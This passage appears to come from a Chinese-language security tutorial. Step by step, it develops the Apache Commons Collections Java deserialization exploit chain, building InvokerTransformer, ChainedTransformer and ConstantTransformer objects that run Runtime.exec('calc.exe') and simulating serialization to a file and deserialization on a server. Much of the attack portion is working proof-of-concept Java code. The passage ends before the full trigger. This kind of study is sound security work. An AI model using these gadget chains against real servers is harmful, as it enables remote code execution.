### 在第二步之前
弹出了计算器！好像很厉害的样子！然后我们来模拟一下利用场景：
  * 为了方便，攻击者受害者写在同一函数中
  * 使用文件写入，代替网络传输
> 由于InvokerTransformer继承了Serializable类，是可以成功序列化的
    public static void main(String[] args) throws Exception {
        //模拟攻击
        //1.客户端构造序列化payload，使用写入文件模拟发包攻击
        InvokerTransformer a = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new String[]{"calc.exe"});
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(a);
        //2.服务端从文件中读取payload模拟接受包，然后触发漏洞
        //服务端反序列化payload读取
            FileInputStream fi = new FileInputStream("payload.bin");
            ObjectInputStream fin = new ObjectInputStream(fi);
        //神奇第一处：服务端需要自主构造恶意input
            Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
        //神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input
            InvokerTransformer a_in = (InvokerTransformer) fin.readObject();
            a_in.transform(input);
    }
我们会发现如果我们要直接利用这个反射机制作为漏洞的话，需要服务端的开发人员：
  1. 帮我们写一个payload作为input；
  2. 接受客户端输入参数，反序列化成InvokerTransformer类
  3. 再刻意调用InvokerTransformer类的transform函数
实际上.....只有开发人员是自己人的情况下才满足条件吧......  
所以我们面临一些问题：
  1. payload肯定需要在客户端可以自定义构造，再传输进入服务端
  2. 服务端需要把我们的输入exp反序列化成一个在代码中可能使用到的类
  3. 并且在代码正常操作中会调用这个类中的一个可触发漏洞地函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行）
  4. 如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！
> 这边假如像预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文条件。  
>  但是对于服务端版本环境是有要求的，之后会说到
那么我们一个个来解决问题：首先使客户端自定义paylaod！
### 第二步 ChainedTransformer
下面我们需要关注 **ChainedTransformer** 这个类,首先看一下这个类的描述：
    /**
        * Transformer implementation that chains the specified transformers together.
        * 
        * The input object is passed to the first transformer. The transformed result
        * is passed to the second transformer and so on.
        * 
        将指定的转换器连接在一起的转化器实现。
        输入的对象将被传递到第一个转化器，转换结果将会输入到第二个转化器，并以此类推
可以知道他会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应的就是 **ChainedTransformer**
类的`transform`函数
    /**
            * Transforms the input to result via each decorated transformer
            * 
            * @param object  the input object passed to the first transformer
            * @return the transformed result
            */
        public Object transform(Object object) {
            for (int i = 0; i getInstance if you want that.
         * 
         * @param transformers  the transformers to chain, not copied, no nulls
         */
        public ChainedTransformer(Transformer[] transformers) {
            super();//这个super不清楚做了啥，
            iTransformers = transformers;
        }
那么我们知道可以自定义iTransformers的内容，我们已有条件如下：
    //最终执行目标
        Class.forName("java.lang.Runtime")
        .getMethod("exec", String.class)
        .invoke(
        Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此处在获取实例
        ,
        "calc.exe"
        )
        //InvokeTransformer关键语句：
        public Object transform(Object input) {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        }
再看到InvokeTransformer代码我们需要 **引出一个注意点** ：
> 这里我们需要注意到`input.getClass()`这个方法使用上的一些区别：
>
>   * 当input是一个类的实例对象时，获取到的是这个类
>   * 当input是一个类时，获取到的是java.lang.Class
>
>
> 可以使用如下代码验证，这里不再赘述
    Object a = Runtime.getRuntime();
        Class b = Runtime.class;
        System.out.println(a.getClass());
        System.out.println(b.getClass());
        //结果
        //class java.lang.Runtime
        //class java.lang.Class
基于之前写的代码：
    //只调用InvokeTransformer的情况如下：
        InvokerTransformer a = new InvokerTransformer(
                    "exec",
                    new Class[]{String.class},
                    new String[]{"calc.exe"});
        Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
我们也可以知道input的为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接进行调用。
先把a封装成ChainedTransformer格式，但是payload还是在外面
    //客户端构造payload
        Transformer[] transformers = new Transformer[] {
            new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
        }
        Transformer transformerChain = new ChainedTransformer(transformers);
        //服务端触发所需内容
        Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
        transformerChain.transform(input);//此处必须为input，作为第一个输入
把payload放入Transformer数组中，需要转化成特定的Transformer格式才行。
#### 第二点五步 ConstantTransformer -> Runtime实例序列化
我们找到`ConstantTransformer`类跟`InvokkerTransformer`一样继承`Transforme`父类，可以进入数组  
顾名思义ConstantTransformer类其实就只会存放一个常量；它的构造函数会写入这个变量，他的transform函数会返回这个变量。  
把Runtime实例写入这个变量：
    Transformer[] transformers = new Transformer[] {
            //以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例
            // new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),
            new ConstantTransformer(Runtime.getRuntime()),
            new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        transformerChain.transform(null);//此处输入可以为任意值，因为不会被使用到，相当于初始第一个输入为我们设置的常量
以上代码可以成功弹框执行！那么我们模拟一下序列化与反序列化过程！
    //客户端构造payload
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),
            new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(transformerChain);
        //服务端反序列化payload读取
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input
        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();
        transformerChain_now.transform(null);
但是很遗憾的告诉以为快要成功的你，成功的本地测试加上序列化、反序列化过程之后就会失败。  
因为Runtime类的定义没有继承`Serializable`类，所以是不支持反序列化的。
那么我们在payload写入Runtime实例的计划就泡汤了。
#### 第二点八步 在服务端生成Runtime实例
既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？  
我们知道Runtime的实例是通过`Runtime.getRuntime()`来获取的，而`InvokerTransformer`里面的反射机制可以执行任意函数。  
同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的.
我们先看getRuntiime方法的参数
    public static Runtime getRuntime() {
        return currentRuntime;
    }
没有参数，那就非常简单了
    Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),//得到Runtime class
                //由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样
                //上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可）
                new InvokerTransformer("getRuntime",new Class[]{},new Object[]{}),
                //上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)     
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        transformerChain.transform(null);
> 在这里，之前自己陷入了一个很傻逼的问题，即：InvokerTransformer类transform方法中return
> method.invoke()这个语句  
>  invoke()调用到底return了啥?  
>  因为在这里形成了一个调用return的结果，再调用的链。为什么就可以上一个输出作为下一个输入时，可以成功调用了呢？  
>  一开始以为invoke会统一返回一个对象作为下一个输入什么的，并且在调试的时候每次invoke的结果都不一样，源码看的头晕。  
>  实际上是钻了死胡同：invoke的return是根据被调用的函数return啥，invoke就return啥。  
>  就好比我invoke一个我自定义的方法a，在a中，我return了字符串"1"。那么就是invoke的结果就是字符串"1"。  
>  看以上的过程就是第一次Runtime.getRuntime()的结果输入了下一个InvokerTransformer
以上感觉是万事大吉了！但是实际上并不是...